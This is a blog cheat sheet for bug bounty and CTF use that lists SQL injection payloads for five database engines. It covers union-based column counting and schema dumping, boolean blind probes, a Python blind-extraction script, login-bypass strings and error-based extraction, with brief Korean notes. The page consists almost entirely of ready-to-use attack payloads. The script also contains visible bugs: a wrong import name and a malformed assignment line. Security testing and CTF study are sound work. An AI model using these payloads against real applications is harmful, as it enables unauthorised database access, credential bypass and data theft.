---
layout: post
date: 2021-01-02 00:00:00
title: "SQL Injection Summary"
categories: CheatSheet
tags: [CheatSheet]
author:
  - Jeongwon Jo
---
Solving the Bug Bounty and CTF challenge, sometimes you need to use SQL Injection attacks. So this time, let's write the attack techniques and bypass techniques for each trick.<br>

---
##  Comment

<b>*<span style="color:#631F9C">&#62;</span> MySQL*</b>
> <span style="color:#3E386D">→</span> &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#35;<br>
> <span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br>

<b>*<span style="color:#631F9C">&#62;</span> MsSQL*</b>
> <span style="color:#3E386D">→</span> &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br>
>	<span style="color:#3E386D">→</span> &#59;&#37;00<br>
> <span style="color:#3E386D">→</span> &#8211;&#8211;&#43;<br>
> <span style="color:#3E386D">→</span> &#8211;&#8211;&#43;&#8211;<br>

<b>*<span style="color:#631F9C">&#62;</span> Oracle*</b>
> <span style="color:#3E386D">→</span> &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br>

<b>*<span style="color:#631F9C">&#62;</span> SQLITE*</b>
> <span style="color:#3E386D">→</span> &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br>

<b>*<span style="color:#631F9C">&#62;</span> PgSQL*</b>
> <span style="color:#3E386D">→</span> &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#47;&#42;&#42;&#47;<br>

---
## Version Check

<b>*<span style="color:#631F9C">&#62;</span> MySQL*</b>
> <span style="color:#3E386D">→</span> version()<br>

<b>*<span style="color:#631F9C">&#62;</span> MsSQL*</b>
> <span style="color:#3E386D">→</span> @@version<br>

<b>*<span style="color:#631F9C">&#62;</span> Oracle*</b>
> <span style="color:#3E386D">→</span> select * from v$version<br>
> <span style="color:#3E386D">→</span> select version from product_component_version<br>

<b>*<span style="color:#631F9C">&#62;</span> SQLITE*</b>
> <span style="color:#3E386D">→</span> sqlite_version()<br>

<b>*<span style="color:#631F9C">&#62;</span> PgSQL*</b>
> <span style="color:#3E386D">→</span> version()<br>

---
## Union Based SQL Injection

<b>*<span style="color:#631F9C">&#62;</span> MySQL*</b>
> <span style="color:#3E386D">→</span> &#39; union select null<br>
> <span style="color:#3E386D">→</span> &#39; union select null, null<br>
> <span style="color:#3E386D">→</span> &#39; union select null, null, null<br>
> <span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br>
(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br>

> <span style="color:#3E386D">→</span> &#39; order by 1<br>
> <span style="color:#3E386D">→</span> &#39; order by 2<br>
> <span style="color:#3E386D">→</span> &#39; order by 3<br>
> <span style="color:#3E386D">→</span> &#39; order by 4<br>
> <span style="color:#3E386D">→</span> &#39; order by N<br>
(If an error occurs using `order by`, the number of columns in use is N-1.)<br>

> <span style="color:#3E386D">→</span> &#39; union select database(), null, null, null<br>
> <span style="color:#3E386D">→</span> &#39; union select group_concat(table_name), null, null, null from information_schema.tables<br>
> <span style="color:#3E386D">→</span> &#39; union select group_concat(column_name), null, null, null from information_schema.columns<br>
> <span style="color:#3E386D">→</span> &#39; union select group_concat(&#60;column_name&#62;), null, null, null from &#60;table_name&#62;<br>

<b>*<span style="color:#631F9C">&#62;</span> MsSQL*</b>

> <span style="color:#3E386D">→</span> &#39; union select null<br>
> <span style="color:#3E386D">→</span> &#39; union select null, null<br>
> <span style="color:#3E386D">→</span> &#39; union select null, null, null<br>
> <span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br>
(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br>

> <span style="color:#3E386D">→</span> &#39; order by 1<br>
> <span style="color:#3E386D">→</span> &#39; order by 2<br>
> <span style="color:#3E386D">→</span> &#39; order by 3<br>
> <span style="color:#3E386D">→</span> &#39; order by 4<br>
> <span style="color:#3E386D">→</span> &#39; order by N<br>
(If an error occurs using `order by`, the number of columns in use is N-1.)<br>

> <span style="color:#3E386D">→</span> &#39; union select db_name(), null, null, null<br>
> <span style="color:#3E386D">→</span> &#39; union select table_name, null, null, null from  (select top 1 table_name from information_schema.tables order by 1) as shit order by 1 desc<br>
> <span style="color:#3E386D">→</span> &#39; union select table_name, null from  (select top 2 table_name from information_schema.tables order by 1) as shit order by 1 desc<br>
> <span style="color:#3E386D">→</span> &#39; union select table_name, null from  (select top 3 table_name from information_schema.tables order by 1) as shit order by 1 desc<br>
> <span style="color:#3E386D">→</span> &#39; union select table_name, null from  (select top 4 table_name from information_schema.tables order by 1) as shit order by 1 desc<br>
> <span style="color:#3E386D">→</span> &#39; union select column_name, null from (select top 1 column_name from information_schema.columns where table_name=&#39;&#60;table_name&#62;&#39; order by 1) as shit order by 1 desc<br>
> <span style="color:#3E386D">→</span> &#39; union select column_name, null, null, null from (select top 2 column_name from information_schema.columns where table_name=&#39;&#60;table_name&#62;&#39; order by 1) as shit order by 1 desc<br>
> <span style="color:#3E386D">→</span> &#39; union select column_name, null, null, null from (select top 3 column_name from information_schema.columns where table_name=&#39;&#60;table_name&#62;&#39; order by 1) as shit order by 1 desc<br>
> <span style="color:#3E386D">→</span> &#39; union select column_name, null, null, null from (select top 4 column_name from information_schema.columns where table_name=&#39;&#60;table_name&#62;&#39; order by 1) as shit order by 1 desc<br>
> <span style="color:#3E386D">→</span> &#39; union select &#60;column_name&#62;, null, null, null from &#60;table_name&#62;<br>

> <span style="color:#3E386D">→</span> &#39; union select string_agg(db_name(),&#39;,&#39;), null, null, null<br>
> <span style="color:#3E386D">→</span> &#39; union select string_agg(table_name,&#39;,&#39;), null, null, null from information_schema.tables<br>
> <span style="color:#3E386D">→</span> &#39;union select string_agg(column_name,&#39;,&#39;), null, null, null from information_schema.columns where table_name='&#60;table_name&#62;'<br>
> <span style="color:#3E386D">→</span> &#39; union select string_agg(&#60;column_name&#62;,&#39;,&#39;), null, null, null from &#60;table_name&#62;<br>

<b>*<span style="color:#631F9C">&#62;</span> Oracle*</b>

> <span style="color:#3E386D">→</span> &#39; union select null from dual<br>
> <span style="color:#3E386D">→</span> &#39; union select null, null from dual<br>
> <span style="color:#3E386D">→</span> &#39; union select null, null, null from dual<br>
> <span style="color:#3E386D">→</span> &#39; union select null, null, null, null from dual<br>
(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br>

> <span style="color:#3E386D">→</span> &#39; order by 1<br>
> <span style="color:#3E386D">→</span> &#39; order by 2<br>
> <span style="color:#3E386D">→</span> &#39; order by 3<br>
> <span style="color:#3E386D">→</span> &#39; order by 4<br>
> <span style="color:#3E386D">→</span> &#39; order by N<br>
(If an error occurs using `order by`, the number of columns in use is N-1.)<br>

> <span style="color:#3E386D">→</span> &#39; union select LISTAGG(table_name,&#39;,&#39;) WITHIN GROUP(ORDER BY table_name), null
FROM user_tables<br>
> <span style="color:#3E386D">→</span> &#39; union select null, LISTAGG(column_name,&#39;,&#39;) WITHIN GROUP(ORDER BY column_name) from cols<br>
> <span style="color:#3E386D">→</span> &#39; union select LISTAGG(&#60;column_name&#62;,&#39;,&#39;) WITHIN GROUP(ORDER BY &#60;column_name&#62;) AS result, null
FROM &#60;table_name&#62;<br>

<b>*<span style="color:#631F9C">&#62;</span> SQLITE*</b>

> <span style="color:#3E386D">→</span> &#39; union select null<br>
> <span style="color:#3E386D">→</span> &#39; union select null, null<br>
> <span style="color:#3E386D">→</span> &#39; union select null, null, null<br>
> <span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br>
(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br>

> <span style="color:#3E386D">→</span> &#39; order by 1<br>
> <span style="color:#3E386D">→</span> &#39; order by 2<br>
> <span style="color:#3E386D">→</span> &#39; order by 3<br>
> <span style="color:#3E386D">→</span> &#39; order by 4<br>
> <span style="color:#3E386D">→</span> &#39; order by N<br>
(If an error occurs using `order by`, the number of columns in use is N-1.)<br>

> <span style="color:#3E386D">→</span> &#39; union select sqlite_version(), null, null, null<br>
> <span style="color:#3E386D">→</span> &#39; union select group_concat(sql), group_concat(name), null, null from sqlite_master<br>
> <span style="color:#3E386D">→</span> &#39; union select group_concat(&#60;column_name&#62;), group_concat(&#60;column_name&#62;), null, null from &#60;table_name&#62;<br>

<b>*<span style="color:#631F9C">&#62;</span> PgSQL*</b>

> <span style="color:#3E386D">→</span> &#39; union select null<br>
> <span style="color:#3E386D">→</span> &#39; union select null, null<br>
> <span style="color:#3E386D">→</span> &#39; union select null, null, null<br>
> <span style="color:#3E386D">→</span> &#39; union select null, null, null, null<br>
(If there is no error when sending 4 nulls as above, it means that 4 columns are being used.)<br>

> <span style="color:#3E386D">→</span> &#39; order by 1<br>
> <span style="color:#3E386D">→</span> &#39; order by 2<br>
> <span style="color:#3E386D">→</span> &#39; order by 3<br>
> <span style="color:#3E386D">→</span> &#39; order by 4<br>
> <span style="color:#3E386D">→</span> &#39; order by N<br>
(If an error occurs using `order by`, the number of columns in use is N-1.)<br>

> <span style="color:#3E386D">→</span> &#39; union select current_database(), null, null, null<br>
> <span style="color:#3E386D">→</span> &#39; union select string_agg(table_name, &#39;,&#39;), null, null, null from information_schema.tables<br>
> <span style="color:#3E386D">→</span> &#39; union select string_agg(column_name, &#39;,&#39;), null, null, null from information_schema.columns where table_name = &#60;table_name&#62;<br>
> <span style="color:#3E386D">→</span> &#39; union select string_agg(&#60;column_name&#62;), null, null, null from &#60;table_name&#62;

<b>*<span style="color:#631F9C">&#62;</span> MsSQL*</b>

---
## Boolean Based Blind SQL Injection

<b>*<span style="color:#631F9C">&#62;</span> MySQL*</b>
> <span style="color:#3E386D">→</span> &#39;or if(length(database())  >N, 1, 0) &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or if(ascii(substr(database(),1,1)) > N, 1, 0) &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or if((select count(table_name) from information_schema.tables) > N, 1, 0)&#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or if((select ascii(substr(table_name,1,1)) from information_schema.tables) > N, 1, 0) &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or if((select count(column_name) from information_schema.columns where table_name = &#60;table_name&#62;) > N, 1, 0)&#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or if((select count(&#60;column_name&#62;) from &#60;table_name&#62;) > N, 1, 0) &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or if((select length(&#60;column_name&#62;) from &#60;table_name&#62;) > N, 1, 0) &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or if((select ascii(substr(&#60;column_name&#62;,1,1)) from &#60;table_name&#62;) > N, 1, 0) &#8211;&#8211;<br>

---
## Efficient Blind SQL Injection

<b>*<span style="color:#631F9C">&#62;</span> MySQL*</b>
```python
import request

url = ''
condition result = '', ''
for i in range(range):
  binary = ''
  for j in range(1, 9):
    query = "'or substr(lpad(bin(ascii(substr(database(), i, 1))), 7, 0), j, 1)%23"
    res = requests.get(url + query)
    if condition in res.text:
      binary += '1'
    else:
      binary += '0'
  result += chr(int(binary, 2))
  
print("[+] Result : {}".format(result))
```

---
## Authentication Bypass

<b>*<span style="color:#631F9C">&#62;</span> MySQL*</b>
> <span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1>0 &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1<>0 &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;<br>

<b>*<span style="color:#631F9C">&#62;</span> MsSQL*</b>
> <span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1>0 &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1<>0 &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;<br>

<b>*<span style="color:#631F9C">&#62;</span> Oracle*</b>
> <span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1>0 &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1<>0 &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;<br>

<b>*<span style="color:#631F9C">&#62;</span> SQLite*</b>
> <span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1==1 &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1>0 &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1<>0 &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1 like 1 &#8211;&#8211;-<br>

<b>*<span style="color:#631F9C">&#62;</span> PgSQL*</b>
> <span style="color:#3E386D">→</span> &#39;or 1=1 &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1in(1) &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1>0 &#8211;&#8211;<br>
> <span style="color:#3E386D">→</span> &#39;or 1<>0 &#8211;&#8211;<br>

---
## ETC

<b>*<span style="color:#631F9C">&#62;</span> MySQL*</b>

> <span style="color:#3E386D">→</span> pow(~(select &#60;column_name&#62; from (select * from &#60;table_name&#62; limit 0,1) as id), 9999)
> <span style="color:#3E386D">→</span> exp(~(select &#60;column_name&#62; from (select * from &#60;table_name&#62; limit 0,1) as a) * 9999)

<strong>Error Based SQL Injection이 가능하다면 위 페이로드를 이용해서 테이블의 존재하는 모든 칼럼을 에러에 포함시켜 출력시킬 수 있습니다. 대신 테이블 이름과 칼럼 이름을 하나 알고 있어야 합니다.</strong><br>

> <span style="color:#3E386D">→</span> select extractvalue(rand(),concat(0x3a,((select &#60;column_name&#62; from &#60;table_name&#62; limit 0, 1))))
<strong>Error Based SQL Injection이 가능하다면 위 페이로드를 이용해서 컬럼 값을 에러에 포함시켜 출력시킬 수 있습니다.</strong>

---
